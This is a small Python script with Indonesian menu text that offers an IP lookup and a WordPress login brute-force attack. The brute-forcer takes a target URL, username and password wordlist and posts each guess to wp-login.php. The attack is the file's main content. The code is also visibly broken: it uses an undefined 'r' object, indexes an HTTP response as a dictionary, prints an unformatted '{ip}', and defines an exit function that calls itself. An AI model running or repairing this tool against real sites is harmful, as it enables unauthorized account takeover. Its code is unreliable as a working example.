import os
import sys
import requests



def cekip():
    print ('[!] Mendapatkan Ip ...!')
    re = requests.get('https://api.myapi.com')
    ip = re['ip']
    print ('[!] ip kamu : {ip} ')


def wpbrute():
    print (''' 
    
    #======[Wordpress Brute Force]======# 
    
   site : target.com/wp-login.php
   user : admin or administrator
   wordlist : contoh.txt
   
    ''')
    
    
    url = input('Target :')
    username = input('username :')
    wordlist = input('wordlist') ; wordlist = open(wordlist, 'r').readlines()
    wordlist = [x.replace("\n", "") for x in wordlist]
    
    
    xmenu ='''
    [+]site : {}
    [+]username : {}
    '''.format(url, username)
    
    print(xmenu)
    
    for password in wordlist:
        payload = {"log" : username,
                   "pwd" :password }
        send = r.post(url, data=payload).text
        if 'wp-login.php?action=lostpassword' in send:
            print ('password gagal => {}'.format(password))
        else :
            print ('password berhasil => {}'.format(password))         
        
    

def exit():
  exit()

menu = '''

===================================
# author   : Ahmad Zein           #
# Selalu bersyukur dengan keadaan #
===================================
1. cekip
2. wpbrute
3. exit

'''.format()

print (menu)
pilih = input("pilih nomor :")

if pilih =="1":
    cekip()
if pilih =="2":
    wpbrute()
if pilih =="3":
   exit()
